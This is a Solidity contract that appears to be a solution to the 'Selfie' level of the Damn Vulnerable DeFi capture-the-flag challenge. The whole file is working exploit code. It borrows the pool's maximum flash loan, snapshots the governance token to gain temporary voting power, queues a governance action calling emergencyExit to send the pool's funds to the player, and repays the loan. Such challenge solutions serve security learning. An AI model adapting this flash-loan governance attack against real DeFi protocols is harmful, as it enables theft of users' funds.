// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;

import "../../06_selfie/SelfiePool.sol";
import "../../06_selfie/SimpleGovernance.sol";
import "forge-std/console.sol";
import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import "../../DamnValuableTokenSnapshot.sol";

contract AttackSelfie is IERC3156FlashBorrower {
    SelfiePool flashPool;
    SimpleGovernance governance;
    address player;
    uint256 public actionId;

    function attack(SelfiePool flashPool_, SimpleGovernance governance_, address player_) external {
        flashPool = flashPool_;
        governance = governance_;
        player = player_;

        flashPool_.flashLoan(this, address(flashPool.token()), flashPool_.maxFlashLoan(address(flashPool.token())), "");
    }

    function onFlashLoan(address, address token, uint256 amount, uint256, bytes calldata) external returns (bytes32) {
        DamnValuableTokenSnapshot(token).snapshot();
        bytes memory data = abi.encodeWithSignature("emergencyExit(address)", player);
        actionId = governance.queueAction(address(flashPool), 0, data);
        DamnValuableTokenSnapshot(token).approve(address(flashPool), amount);
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }
}
